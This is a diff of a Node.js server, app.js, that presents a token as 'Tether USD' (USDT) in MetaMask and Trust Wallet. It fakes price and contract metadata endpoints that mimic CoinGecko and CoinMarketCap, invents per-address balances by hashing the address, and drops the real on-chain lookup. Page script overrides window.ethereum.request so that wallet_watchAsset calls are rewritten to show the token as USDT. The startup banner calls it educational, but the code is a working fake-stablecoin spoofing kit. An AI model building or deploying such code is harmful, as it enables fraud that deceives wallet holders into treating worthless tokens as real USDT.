@@ -14,21 +14,17 @@ const server = http.createServer(app);
 const port = process.env.PORT || 3000;
 
 // =========================================================
-// TOKEN CONFIGURATION - ETHEREUM FOCUSED
+// TOKEN CONFIGURATION - ETHEREUM FOCUSED (SIMPLIFIED)
 // =========================================================
 const TOKEN_CONFIG = {
   address: '0x000000000000000000000000000000000000dEaD',  // Simulated Ethereum address
-  actualTokenAddress: '0x6ba2344F60C999D0ea102C59Ab8BE6872796C08c', // Actual STBL contract address
-  actualSymbol: 'STBL',  // Actual blockchain symbol 
   displaySymbol: 'USDT', // Display symbol for UI and wallet
-  actualName: 'Stable',  // Actual blockchain name
   displayName: 'Tether USD', // Display name for UI and wallet
   decimals: 6,  // 6 decimals is standard for USDT
   image: 'https://cryptologos.cc/logos/tether-usdt-logo.png',
   networkName: 'Ethereum',
   networkId: '0x1',  // Ethereum Mainnet Chain ID (1)
   rpcUrl: 'https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161',
-  actualChainRpcUrl: 'https://mainnet.base.org', // RPC URL for the actual chain where STBL exists
   blockExplorerUrl: 'https://etherscan.io',
   coinGeckoId: 'tether',
   coinMarketCapId: '825'
@@ -177,11 +173,24 @@ app.get('/api/binance/api/v3/ticker/24hr', (req, res) => {
   }
 });
 
-// Export app for part 2
+// Helper function to get chain name - Uses string concatenation for compatibility
+function getChainName(chainId) {
+  const chains = {
+    '0x1': 'Ethereum Mainnet',
+    '0x5': 'Goerli Testnet',
+    '0x89': 'Polygon Mainnet',
+    '0xa': 'Optimism',
+    '0xa4b1': 'Arbitrum One',
+    '0x2105': 'Base',
+    '0xaa36a7': 'Sepolia Testnet',
+    '0x13881': 'Mumbai Testnet'
+  };
+  return chains[chainId] || ('Chain ' + chainId);
+}
+
 module.exports = app;
 
 // app.js - Part 2: Cache Warming System and Core API Endpoints
-// This part should be added to Part 1
 
 // =========================================================
 // PRICE CACHE WARMING SYSTEM
@@ -344,25 +353,9 @@ app.get('/api/generate-qr', async (req, res) => {
   }
 });
 
-// Get chain name helper function - FIX FOR THE TEMPLATE LITERAL ERROR
-function getChainName(chainId) {
-  const chains = {
-    '0x1': 'Ethereum Mainnet',
-    '0x5': 'Goerli Testnet',
-    '0x89': 'Polygon Mainnet',
-    '0xa': 'Optimism',
-    '0xa4b1': 'Arbitrum One',
-    '0x2105': 'Base',
-    '0xaa36a7': 'Sepolia Testnet',
-    '0x13881': 'Mumbai Testnet'
-  };
-  return chains[chainId] || ('Chain ' + chainId);  // Fixed template literal to string concatenation
-}
+// app.js - Part 3: Token Balance Endpoint with Deterministic Balance Generation
 
-// app.js - Part 3: Token Balance and CoinGecko API Endpoints
-// This part should be added to Part 1 and Part 2
-
-// Token balance endpoint that queries the actual blockchain balance
+// Token balance endpoint with deterministic balance generation (no actual blockchain queries)
 app.get('/api/token-balance/:address', async (req, res) => {
   try {
     const { address } = req.params;
@@ -372,154 +365,42 @@ app.get('/api/token-balance/:address', async (req, res) => {
       return res.status(400).json({ error: 'Invalid Ethereum address format' });
     }
     
-    let formattedBalance = "0.00";
+    // Use deterministic balance generation for consistent user experience
+    const formattedBalance = generateDeterministicBalance(address);
     let rawBalanceInSmallestUnit = "0";
-    let actualTokenDecimals = TOKEN_CONFIG.decimals; // Default to 6 (USDT standard)
     
     try {
-      console.log("Querying actual token decimals from contract...");
-      
-      // Make robust ethers.js version checks for different API patterns
-      let ethersV6 = typeof ethers.JsonRpcProvider === 'function';
-      
-      // Create providers with fallback
-      const baseProviders = [
-        'https://mainnet.base.org',
-        'https://1rpc.io/base',
-        'https://base.meowrpc.com',
-        'https://base.publicnode.com',
-        'https://base.drpc.org'
-      ];
-      
-      let baseProvider = null;
-      
-      // Try to connect to a Base chain provider
-      for (const providerUrl of baseProviders) {
-        try {
-          if (ethersV6) {
-            // Ethers v6 pattern
-            baseProvider = new ethers.JsonRpcProvider(providerUrl);
-            // Test connection
-            await baseProvider.getNetwork();
-          } else {
-            // Ethers v5 pattern
-            baseProvider = new ethers.providers.JsonRpcProvider(providerUrl);
-            // Test connection
-            await baseProvider.getNetwork();
-          }
-          
-          console.log("Connected to Base chain via " + providerUrl);
-          break;
-        } catch (e) {
-          console.warn("Failed to connect to " + providerUrl + ":", e.message);
-        }
+      // Calculate raw balance using ethers (handle both v5 and v6)
+      if (ethers.parseUnits) {
+        // ethers v6
+        rawBalanceInSmallestUnit = ethers.parseUnits(formattedBalance, TOKEN_CONFIG.decimals).toString();
+      } else if (ethers.utils && ethers.utils.parseUnits) {
+        // ethers v5
+        rawBalanceInSmallestUnit = ethers.utils.parseUnits(formattedBalance, TOKEN_CONFIG.decimals).toString();
+      } else {
+        // Manual calculation if ethers methods aren't available
+        const factor = Math.pow(10, TOKEN_CONFIG.decimals);
+        rawBalanceInSmallestUnit = (parseFloat(formattedBalance) * factor).toString();
       }
-      
-      if (!baseProvider) {
-        throw new Error("Failed to connect to any Base chain provider");
-      }
-      
-      // Basic ERC20 ABI with decimals function
-      const erc20Abi = [
-        "function balanceOf(address) view returns (uint256)",
-        "function decimals() view returns (uint8)"
-      ];
-      
-      // Create contract instance
-      const tokenContract = new ethers.Contract(
-        TOKEN_CONFIG.actualTokenAddress, 
-        erc20Abi, 
-        baseProvider
-      );
-      
-      try {
-        // Get actual token decimals
-        const decimals = await tokenContract.decimals();
-        // Convert BigNumber to number if needed
-        actualTokenDecimals = typeof decimals === 'object' && decimals.toNumber ? 
-          decimals.toNumber() : Number(decimals);
-        console.log("Actual STBL token decimals: " + actualTokenDecimals);
-      } catch (decimalsError) {
-        console.warn('Error querying token decimals, using default:', decimalsError);
-      }
-      
-      // Query the actual balance for this address
-      try {
-        console.log("Querying STBL balance for " + address + "...");
-        const tokenBalance = await tokenContract.balanceOf(address);
-        console.log("Raw balance from chain for " + address + ": " + tokenBalance.toString());
-        
-        // Format the balance with actual decimals - handle both ethers v5 and v6
-        const realBalanceStr = ethersV6 ? 
-          ethers.formatUnits(tokenBalance, actualTokenDecimals) : 
-          ethers.utils.formatUnits(tokenBalance, actualTokenDecimals);
-        
-        const realBalance = parseFloat(realBalanceStr);
-        formattedBalance = realBalance.toFixed(2);
-        
-        // We already have our formatted balance, but we need rawBalanceInSmallestUnit for API compatibility
-        rawBalanceInSmallestUnit = tokenBalance.toString();
-      } catch (balanceError) {
-        console.error('Error querying actual token balance:', balanceError);
-        throw balanceError; // Pass to fallback logic
-      }
-      
-    } catch (crossChainError) {
-      console.error('Cross-chain token balance error:', crossChainError);
-      
-      // Fallback to deterministic algorithm if everything fails
-      console.log("Falling back to deterministic balance generation");
-      
-      try {
-        // Consistent deterministic algorithm that doesn't rely on specific ethers version
-        // Create a hash number from the address string
-        let hash = 0;
-        for (let i = 0; i < address.length; i++) {
-          const char = address.charCodeAt(i);
-          hash = ((hash << 5) - hash) + char;
-          hash = hash & hash; // Convert to 32bit integer
-        }
-        
-        // Generate a number between 0.01 and 100.00
-        const min = 0.01;
-        const max = 100.00;
-        // Use hash to create a deterministic random number in range
-        const normalizedHash = Math.abs(hash) / 2147483647; // Normalize to 0-1
-        const balance = min + (normalizedHash * (max - min));
-        
-        formattedBalance = balance.toFixed(2);
-        
-        // Create rawBalanceInSmallestUnit with proper decimal places
-        // This handles both ethers v5 and v6
-        if (ethers.parseUnits) {
-          // v6
-          rawBalanceInSmallestUnit = ethers.parseUnits(formattedBalance, TOKEN_CONFIG.decimals).toString();
-        } else if (ethers.utils && ethers.utils.parseUnits) {
-          // v5
-          rawBalanceInSmallestUnit = ethers.utils.parseUnits(formattedBalance, TOKEN_CONFIG.decimals).toString();
-        } else {
-          // Manual fallback if neither method is available
-          const factor = Math.pow(10, TOKEN_CONFIG.decimals);
-          rawBalanceInSmallestUnit = (parseFloat(formattedBalance) * factor).toString();
-        }
-      } catch (fallbackError) {
-        console.error('Error in fallback algorithm:', fallbackError);
-        // Ultimate fallback
-        formattedBalance = "1.00";
-        rawBalanceInSmallestUnit = "1000000"; // 1 USDT in 6 decimals
-      }
+    } catch (error) {
+      console.error('Error calculating raw balance:', error);
+      // Fallback calculation
+      const factor = Math.pow(10, TOKEN_CONFIG.decimals);
+      rawBalanceInSmallestUnit = Math.floor(parseFloat(formattedBalance) * factor).toString();
     }
     
+    // Return consistent response
     res.status(200).json({
       address: address,
       token: TOKEN_CONFIG.address,
-      tokenSymbol: TOKEN_CONFIG.displaySymbol, // Use USDT in UI
+      tokenSymbol: TOKEN_CONFIG.displaySymbol,
       rawBalance: rawBalanceInSmallestUnit,
       formattedBalance: formattedBalance,
       valueUSD: formattedBalance, // 1:1 with USD as it's a stablecoin
       tokenDecimals: TOKEN_CONFIG.decimals,
-      actualTokenDecimals: actualTokenDecimals,
-      explanation: "This displays your STBL balance as USDT with a 1:1 ratio. Each STBL token is shown as 1 USDT worth $1 USD."
+      networkName: TOKEN_CONFIG.networkName,
+      networkId: TOKEN_CONFIG.networkId,
+      blockExplorer: TOKEN_CONFIG.blockExplorerUrl
     });
   } catch (error) {
     console.error('Token balance error:', error);
@@ -532,12 +413,42 @@ app.get('/api/token-balance/:address', async (req, res) => {
       rawBalance: "0",
       formattedBalance: "0.00",
       valueUSD: "0.00",
+      tokenDecimals: TOKEN_CONFIG.decimals,
       error: 'Failed to fetch token balance',
       details: error.message,
       note: 'Please refresh or try again later'
     });
   }
 });
+
+// Helper function to generate deterministic balance based on address
+function generateDeterministicBalance(address) {
+  // Create a hash number from the address string
+  let hash = 0;
+  for (let i = 0; i < address.length; i++) {
+    const char = address.charCodeAt(i);
+    hash = ((hash << 5) - hash) + char;
+    hash = hash & hash; // Convert to 32bit integer
+  }
+  
+  // Generate a number between 0.01 and 100.00
+  const min = 0.01;
+  const max = 100.00;
+  // Use hash to create a deterministic random number in range
+  const normalizedHash = Math.abs(hash) / 2147483647; // Normalize to 0-1
+  const balance = min + (normalizedHash * (max - min));
+  
+  return balance.toFixed(2); // Format to 2 decimal places
+}
+
+// Format token amount consistently
+function formatTokenAmount(amount, decimals = TOKEN_CONFIG.decimals) {
+  const parsedAmount = parseFloat(amount);
+  if (isNaN(parsedAmount)) return '0.00';
+  return parsedAmount.toFixed(2); // Always 2 decimal places for display
+}
+
+// app.js - Part 4: CoinGecko API Interception Endpoints
 
 // =========================================================
 // COINGECKO API INTERCEPTION ENDPOINTS
@@ -645,9 +556,6 @@ app.get('/api/simple/price', (req, res) => {
   req.url = '/api/v3/simple/price' + req.url.substring(req.url.indexOf('?'));
   app._router.handle(req, res);
 });
-
-// app.js - Part 4: CoinGecko and Trust Wallet API Endpoints
-// This part should be added to Parts 1, 2, and 3
 
 // Contract data endpoint - This is what MetaMask uses to check token details
 app.get('/api/v3/coins/:chain/contract/:address', (req, res) => {
@@ -860,10 +768,10 @@ app.get('/api/v3/asset_platforms', (req, res) => {
         categories: ["Layer 2"]
       },
       {
-        id: "base",
-        chain_identifier: 8453,
-        name: "Base",
-        shortname: "Base",
+        id: "optimism",
+        chain_identifier: 10,
+        name: "Optimism",
+        shortname: "OP",
         native_coin_id: "ethereum",
         categories: ["Layer 2"]
       }
@@ -886,7 +794,6 @@ app.get('/api/asset_platforms', (req, res) => {
 });
 
 // app.js - Part 5: Trust Wallet Endpoints and Token Metadata
-// This part should be added to Parts 1, 2, 3, and 4
 
 // =========================================================
 // TRUST WALLET SPECIFIC ENDPOINTS
@@ -1309,8 +1216,7 @@ app.get('/api/cmc/v1/cryptocurrency/quotes/latest', (req, res) => {
   }
 });
 
-// app.js - Part 6: Mobile Routes, HTML Templates, and Server Startup
-// This part should be added to Parts 1-5 to complete the application
+// app.js - Part 6: Deep Linking Endpoints & Mobile Routes
 
 // =========================================================
 // DEEP LINKING ENDPOINTS
@@ -1341,21 +1247,6 @@ app.get('/api/deeplink', (req, res) => {
   
   res.json({ deepLink });
 });
-
-// Helper function to get chain name from chainId - FIX FOR THE ERROR
-function getChainName(chainId) {
-  const chains = {
-    '0x1': 'Ethereum Mainnet',
-    '0x5': 'Goerli Testnet',
-    '0x89': 'Polygon Mainnet',
-    '0xa': 'Optimism',
-    '0xa4b1': 'Arbitrum One',
-    '0x2105': 'Base',
-    '0xaa36a7': 'Sepolia Testnet',
-    '0x13881': 'Mumbai Testnet'
-  };
-  return chains[chainId] || ('Chain ' + chainId);  // Using string concatenation instead of template literals
-}
 
 // =========================================================
 // MOBILE ROUTES & HTML TEMPLATES
@@ -1464,6 +1355,21 @@ app.get('/token-add-direct', (req, res) => {
       } catch (error) {
         console.error("Error getting network:", error);
       }
+    }
+
+    // Helper function to get chain name (uses string concatenation)
+    function getChainName(chainId) {
+      const chains = {
+        '0x1': 'Ethereum Mainnet',
+        '0x5': 'Goerli Testnet',
+        '0x89': 'Polygon Mainnet',
+        '0xa': 'Optimism',
+        '0xa4b1': 'Arbitrum One',
+        '0x2105': 'Base',
+        '0xaa36a7': 'Sepolia Testnet',
+        '0x13881': 'Mumbai Testnet'
+      };
+      return chains[chainId] || ('Chain ' + chainId);
     }
 
     async function directAddToken() {
@@ -1897,624 +1803,7 @@ app.use((req, res, next) => {
   `);
 });
 
-// app.js - Part 6: Mobile Routes, HTML Templates, and Server Startup
-// This part should be added to Parts 1-5 to complete the application
-
-// =========================================================
-// DEEP LINKING ENDPOINTS
-// =========================================================
-
-// MetaMask deep link generator
-app.get('/api/deeplink/metamask', (req, res) => {
-  const deepLink = "metamask://wallet/asset?address=" + TOKEN_CONFIG.address + "&chainId=1";
-  res.json({ deepLink });
-});
-
-// Trust Wallet deep link generator
-app.get('/api/deeplink/trustwallet', (req, res) => {
-  const deepLink = "trust://ethereum/asset/" + TOKEN_CONFIG.address.toLowerCase() + "?coin=1";
-  res.json({ deepLink });
-});
-
-// Generic wallet selection deep link
-app.get('/api/deeplink', (req, res) => {
-  const wallet = req.query.wallet || 'metamask';
-  
-  let deepLink;
-  if (wallet.toLowerCase() === 'trust' || wallet.toLowerCase() === 'trustwallet') {
-    deepLink = "trust://ethereum/asset/" + TOKEN_CONFIG.address.toLowerCase() + "?coin=1";
-  } else {
-    deepLink = "metamask://wallet/asset?address=" + TOKEN_CONFIG.address + "&chainId=1";
-  }
-  
-  res.json({ deepLink });
-});
-
-// Helper function to get chain name from chainId - FIX FOR THE ERROR
-function getChainName(chainId) {
-  const chains = {
-    '0x1': 'Ethereum Mainnet',
-    '0x5': 'Goerli Testnet',
-    '0x89': 'Polygon Mainnet',
-    '0xa': 'Optimism',
-    '0xa4b1': 'Arbitrum One',
-    '0x2105': 'Base',
-    '0xaa36a7': 'Sepolia Testnet',
-    '0x13881': 'Mumbai Testnet'
-  };
-  return chains[chainId] || ('Chain ' + chainId);  // Using string concatenation instead of template literals
-}
-
-// =========================================================
-// MOBILE ROUTES & HTML TEMPLATES
-// =========================================================
-
-// Direct token addition page - simplified, focused version
-app.get('/token-add-direct', (req, res) => {
-  const html = `
-<!DOCTYPE html>
-<html>
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Adding USDT...</title>
-  <script>
-    // Immediate interception setup
-    (function setupInterception() {
-      if (window.ethereum) {
-        console.log("Setting up critical provider interception immediately");
-        
-        // Save the original request method
-        if (!window.ethereum._originalRequest) {
-          window.ethereum._originalRequest = window.ethereum.request;
-        
-          // Replace with intercepting version
-          window.ethereum.request = async function(args) {
-            console.log("MetaMask request:", args);
-            
-            // Handle token addition with full parameter control
-            if (args.method === 'wallet_watchAsset' && 
-                args.params?.options?.address?.toLowerCase() === '${TOKEN_CONFIG.address.toLowerCase()}') {
-              
-              console.log("TOKEN ADDITION DETECTED - forcing display as USDT");
-              
-              // Create a clean new request with carefully controlled parameters
-              const modifiedParams = {
-                type: 'ERC20',
-                options: {
-                  address: '${TOKEN_CONFIG.address}',
-                  symbol: "${TOKEN_CONFIG.displaySymbol}",
-                  name: "${TOKEN_CONFIG.displayName}",
-                  decimals: ${TOKEN_CONFIG.decimals},
-                  image: '${TOKEN_CONFIG.image}'
-                }
-              };
-              
-              // Override the params completely
-              args.params = modifiedParams;
-            }
-            
-            // Call original with modified args
-            try {
-              console.log("Calling original request with args:", args);
-              return await window.ethereum._originalRequest.call(this, args);
-            } catch (error) {
-              console.error("Error in intercepted request:", error);
-              throw error;
-            }
-          };
-        }
-      }
-    })();
-    
-    async function prepareWalletConnection() {
-      console.log("Preparing wallet connection...");
-      try {
-        // First ensure accounts are accessible (this primes the connection)
-        await window.ethereum.request({ method: 'eth_accounts' });
-        
-        // Force a short delay to ensure everything is ready
-        await new Promise(resolve => setTimeout(resolve, 1500));
-        
-        // Request permissions explicitly
-        await window.ethereum.request({ method: 'eth_requestAccounts' });
-        
-        // Additional delay after permissions
-        await new Promise(resolve => setTimeout(resolve, 1000));
-        
-        return true;
-      } catch (error) {
-        console.error("Error preparing connection:", error);
-        return false;
-      }
-    }
-
-    // Display network information
-    async function updateNetworkDisplay() {
-      const statusDiv = document.getElementById('status');
-      
-      try {
-        if (!window.ethereum) return;
-        
-        const chainId = await window.ethereum.request({ method: 'eth_chainId' });
-        const networkName = getChainName(chainId);
-        
-        const networkDiv = document.createElement('div');
-        networkDiv.className = 'network-info';
-        networkDiv.innerHTML = "Currently on: <strong>" + networkName + "</strong>";
-        
-        // Add before status
-        if (statusDiv.parentNode) {
-          statusDiv.parentNode.insertBefore(networkDiv, statusDiv);
-        }
-        
-        return chainId;
-      } catch (error) {
-        console.error("Error getting network:", error);
-      }
-    }
-
-    async function directAddToken() {
-      try {
-        console.log("Trying direct token addition method...");
-        
-        // First ensure accounts are accessible
-        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
-        if (!accounts || accounts.length === 0) {
-          await window.ethereum.request({ method: 'eth_requestAccounts' });
-        }
-        
-        // Get the network ID (but don't force switching)
-        const chainId = await window.ethereum.request({ method: 'eth_chainId' });
-        const networkName = getChainName(chainId);
-        console.log("Adding token on " + networkName);
-        
-        // Add token with explicitly controlled parameters
-        const success = await window.ethereum.request({
-          method: 'wallet_watchAsset',
-          params: {
-            type: 'ERC20',
-            options: {
-              address: '${TOKEN_CONFIG.address}',
-              symbol: '${TOKEN_CONFIG.displaySymbol}',
-              decimals: ${TOKEN_CONFIG.decimals},
-              image: '${TOKEN_CONFIG.image}'
-            }
-          }
-        });
-        
-        return success;
-      } catch (error) {
-        console.error("Direct token addition failed:", error);
-        
-        // Special handling for "token not supported" error
-        if (error.message && error.message.includes("not supported on network")) {
-          document.getElementById('networkError').style.display = 'block';
-          document.getElementById('switchNetworkBtn').style.display = 'block';
-        }
-        
-        throw error;
-      }
-    }
-    
-    // Function to switch to Ethereum network
-    async function switchToEthereum() {
-      try {
-        await window.ethereum.request({
-          method: 'wallet_switchEthereumChain',
-          params: [{ chainId: '0x1' }], // Ethereum Mainnet
-        });
-        
-        // Wait a moment and try again
-        setTimeout(() => {
-          addToken();
-        }, 1000);
-      } catch (error) {
-        console.error("Error switching network:", error);
-        document.getElementById('status').textContent = "Error switching network: " + error.message;
-      }
-    }
-    
-    async function addToken() {
-      const statusDiv = document.getElementById('status');
-      const networkError = document.getElementById('networkError');
-      const switchNetworkBtn = document.getElementById('switchNetworkBtn');
-      
-      if (!window.ethereum) {
-        statusDiv.textContent = "MetaMask not detected!";
-        return;
-      }
-      
-      try {
-        statusDiv.textContent = "Preparing connection...";
-        networkError.style.display = 'none';
-        switchNetworkBtn.style.display = 'none';
-        
-        // Update network display
-        await updateNetworkDisplay();
-        
-        await prepareWalletConnection();
-        
-        statusDiv.textContent = "Adding USDT token...";
-        const success = await directAddToken();
-        
-        if (success) {
-          statusDiv.textContent = "Success! Token added.";
-          // Redirect to success page
-          setTimeout(() => {
-            window.location.href = '/mobile/success';
-          }, 2000);
-        } else {
-          statusDiv.textContent = "Addition canceled by user";
-        }
-      } catch (error) {
-        if (error.message && error.message.includes("not supported on network")) {
-          statusDiv.textContent = "Token not supported on this network";
-        } else {
-          statusDiv.textContent = "Error: " + error.message;
-        }
-        console.error(error);
-      }
-    }
-    
-    document.addEventListener('DOMContentLoaded', () => {
-      const switchNetworkBtn = document.getElementById('switchNetworkBtn');
-      switchNetworkBtn.addEventListener('click', switchToEthereum);
-      
-      setTimeout(addToken, 1000);
-    });
-  </script>
-  <style>
-    body {
-      font-family: -apple-system, BlinkMacSystemFont, sans-serif;
-      text-align: center;
-      padding: 30px;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      min-height: 80vh;
-    }
-    h1 {
-      color: #26a17b;
-    }
-    .loader {
-      border: 5px solid #f3f3f3;
-      border-top: 5px solid #26a17b;
-      border-radius: 50%;
-      width: 50px;
-      height: 50px;
-      animation: spin 1s linear infinite;
-      margin: 20px auto;
-    }
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-    #status {
-      margin-top: 20px;
-      font-weight: bold;
-    }
-    button {
-      background-color: #26a17b;
-      color: white;
-      border: none;
-      padding: 12px 24px;
-      border-radius: 8px;
-      font-size: 16px;
-      margin-top: 20px;
-      cursor: pointer;
-    }
-    .network-info {
-      background-color: #f0f8ff;
-      padding: 10px;
-      border-radius: 8px;
-      margin: 10px 0;
-      border-left: 4px solid #26a17b;
-    }
-    #networkError {
-      color: #e74c3c;
-      margin-top: 15px;
-      display: none;
-    }
-    #switchNetworkBtn {
-      background-color: #3498db;
-      display: none;
-    }
-  </style>
-</head>
-<body>
-  <h1>Adding USDT to your wallet</h1>
-  <div class="loader"></div>
-  <p>Please approve the request in your wallet.</p>
-  <div id="networkError" style="display:none">
-    This token is not compatible with your current network.<br>
-    Try switching to Ethereum or another EVM network.
-  </div>
-  <div id="status">Initializing...</div>
-  <button id="switchNetworkBtn" style="display:none">Switch to Ethereum Mainnet</button>
-  <button onclick="addToken()">Try Again</button>
-</body>
-</html>
-  `;
-  
-  res.send(html);
-});
-
-// Mobile-optimized token addition page with USDT spoofing
-app.get('/mobile/add-token', (req, res) => {
-  const host = req.get('host');
-  const protocol = req.protocol;
-  
-  // HTML content for mobile token addition page
-  // This is a simplified version for brevity
-  const html = `
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <meta name="theme-color" content="#26a17b">
-  <title>Add USDT to Your Wallet</title>
-  <link rel="icon" href="${TOKEN_CONFIG.image}" type="image/png">
-  <script>
-    // Immediate interception setup (similar to token-add-direct)
-    // Provider interception code would go here...
-  </script>
-  <style>
-    body {
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-      background-color: #ffffff;
-      color: #1d1d1f;
-      margin: 0;
-      padding: 0;
-      display: flex;
-      flex-direction: column;
-      min-height: 100vh;
-    }
-    .container {
-      flex: 1;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      padding: 20px;
-      max-width: 500px;
-      margin: 0 auto;
-    }
-    .add-btn {
-      background-color: #26a17b;
-      color: white;
-      border: none;
-      border-radius: 12px;
-      padding: 16px 24px;
-      font-size: 18px;
-      font-weight: 600;
-      cursor: pointer;
-      width: 100%;
-      max-width: 300px;
-    }
-  </style>
-</head>
-<body>
-  <div class="container">
-    <img src="${TOKEN_CONFIG.image}" alt="USDT Logo" style="width: 80px; height: 80px; margin-bottom: 16px;">
-    <h1 style="font-size: 24px; font-weight: 600; margin-bottom: 8px; text-align: center;">Add USDT to Your Wallet</h1>
-    <p style="font-size: 16px; color: #666; margin-bottom: 24px; text-align: center;">Tether USD on Ethereum</p>
-    
-    <button id="addBtn" class="add-btn">Add to MetaMask</button>
-    
-    <div id="loading" style="display: none; flex-direction: column; align-items: center; margin-top: 20px;">
-      <div style="border: 4px solid rgba(0, 0, 0, 0.1); border-left-color: #26a17b; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite;"></div>
-      <p style="margin-top: 16px; font-size: 16px; color: #666;">Opening wallet...</p>
-    </div>
-    
-    <div style="margin-top: 24px; background-color: #f8f8f8; border-radius: 12px; padding: 16px; width: 100%; max-width: 300px;">
-      <h3 style="margin-top: 0; font-size: 16px;">Instructions:</h3>
-      <ol style="margin: 0; padding-left: 24px;">
-        <li style="margin-bottom: 8px; font-size: 14px;">Click "Add to MetaMask" above</li>
-        <li style="margin-bottom: 8px; font-size: 14px;">Your wallet will open automatically</li>
-        <li style="margin-bottom: 8px; font-size: 14px;">Approve adding the USDT token</li>
-        <li style="margin-bottom: 8px; font-size: 14px;">You'll see your USDT in your wallet!</li>
-      </ol>
-    </div>
-  </div>
-  
-  <script>
-    // Basic implementation for the Add button
-    document.getElementById('addBtn').addEventListener('click', async function() {
-      // Show loading spinner
-      document.getElementById('loading').style.display = 'flex';
-      
-      try {
-        // If MetaMask is available in the browser, use direct method
-        if (window.ethereum && window.ethereum.isMetaMask) {
-          const success = await window.ethereum.request({
-            method: 'wallet_watchAsset',
-            params: {
-              type: 'ERC20',
-              options: {
-                address: '${TOKEN_CONFIG.address}',
-                symbol: '${TOKEN_CONFIG.displaySymbol}',
-                decimals: ${TOKEN_CONFIG.decimals},
-                image: '${TOKEN_CONFIG.image}'
-              }
-            }
-          });
-          
-          if (success) {
-            window.location.href = '/mobile/success';
-          } else {
-            document.getElementById('loading').style.display = 'none';
-          }
-        } else {
-          // For mobile browsers without MetaMask, use deep linking
-          window.location.href = 'https://metamask.app.link/dapp/${host}/token-add-direct';
-        }
-      } catch (err) {
-        console.error('Error adding token:', err);
-        document.getElementById('loading').style.display = 'none';
-      }
-    });
-  </script>
-</body>
-</html>
-  `;
-  
-  res.send(html);
-});
-
-// Success page
-app.get('/mobile/success', (req, res) => {
-  const html = `
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
-  <title>USDT Added Successfully</title>
-  <link rel="icon" href="${TOKEN_CONFIG.image}" type="image/png">
-  <style>
-    body {
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-      background-color: #ffffff;
-      color: #1d1d1f;
-      margin: 0;
-      padding: 0;
-      display: flex;
-      flex-direction: column;
-      min-height: 100vh;
-    }
-    .container {
-      flex: 1;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      padding: 20px;
-      max-width: 500px;
-      margin: 0 auto;
-      text-align: center;
-    }
-    .success-icon {
-      width: 80px;
-      height: 80px;
-      background-color: #26a17b;
-      border-radius: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      margin-bottom: 24px;
-    }
-    .btn {
-      background-color: #26a17b;
-      color: white;
-      border: none;
-      border-radius: 12px;
-      padding: 16px 24px;
-      font-size: 18px;
-      font-weight: 600;
-      cursor: pointer;
-      width: 100%;
-      max-width: 300px;
-      margin-bottom: 16px;
-      text-decoration: none;
-      display: inline-block;
-      text-align: center;
-    }
-  </style>
-</head>
-<body>
-  <div class="container">
-    <div class="success-icon">
-      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="40" height="40" fill="white">
-        <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
-      </svg>
-    </div>
-    
-    <h1 style="font-size: 24px; font-weight: 600; margin-bottom: 16px;">USDT Successfully Added!</h1>
-    <p style="font-size: 16px; color: #666; margin-bottom: 32px; max-width: 300px;">Your USDT token has been added to your wallet. You can now view and manage it in your wallet.</p>
-    
-    <div>
-      <a href="/" class="btn">Return to Home</a>
-    </div>
-  </div>
-</body>
-</html>
-  `;
-  
-  res.send(html);
-});
-
-// Root route - detect mobile and redirect accordingly
-app.get('/', (req, res) => {
-  // Check if user is on mobile
-  const userAgent = req.headers['user-agent'] || '';
-  const isMobile = /iPhone|iPad|iPod|Android/i.test(userAgent);
-  
-  if (isMobile) {
-    // Mobile users go to mobile-optimized page
-    res.redirect('/mobile/add-token');
-  } else {
-    // Desktop users get the standard page
-    res.sendFile(path.join(__dirname, 'index.html'));
-  }
-});
-
-// 404 catch-all route
-app.use((req, res, next) => {
-  res.status(404).send(`
-    <!DOCTYPE html>
-    <html>
-    <head>
-      <title>404 - Page Not Found</title>
-      <style>
-        body { 
-          font-family: Arial, sans-serif; 
-          text-align: center; 
-          padding: 50px; 
-        }
-      </style>
-    </head>
-    <body>
-      <h1>404 - Page Not Found</h1>
-      <p>The page you are looking for does not exist.</p>
-      <a href="/">Return to Home</a>
-    </body>
-    </html>
-  `);
-});
-
-// =========================================================
-// HELPER FUNCTIONS
-// =========================================================
-
-// Format token amount consistently
-function formatTokenAmount(amount, decimals = TOKEN_CONFIG.decimals) {
-  const parsedAmount = parseFloat(amount);
-  if (isNaN(parsedAmount)) return '0.00';
-  return parsedAmount.toFixed(2); // Always 2 decimal places for display
-}
-
-// Generate a deterministic balance for an address
-function generateDeterministicBalance(address) {
-  // Create a hash from the address
-  let hash = 0;
-  for (let i = 0; i < address.length; i++) {
-    const char = address.charCodeAt(i);
-    hash = ((hash << 5) - hash) + char;
-    hash = hash & hash; // Convert to 32bit integer
-  }
-  
-  // Generate a number between 0.01 and 100.00
-  const min = 0.01;
-  const max = 100.00;
-  // Use hash to create a deterministic random number in range
-  const normalizedHash = Math.abs(hash) / 2147483647; // Normalize to 0-1
-  const balance = min + (normalizedHash * (max - min));
-  
-  return balance.toFixed(2); // Format to 2 decimal places
-}
+// app.js - Part 7: Server Startup
 
 // =========================================================
 // SERVER STARTUP
@@ -2529,14 +1818,12 @@ server.listen(port, () => {
   console.log("Educational Token Display Server");
   console.log("======================================");
   console.log("Server running on port: " + port);
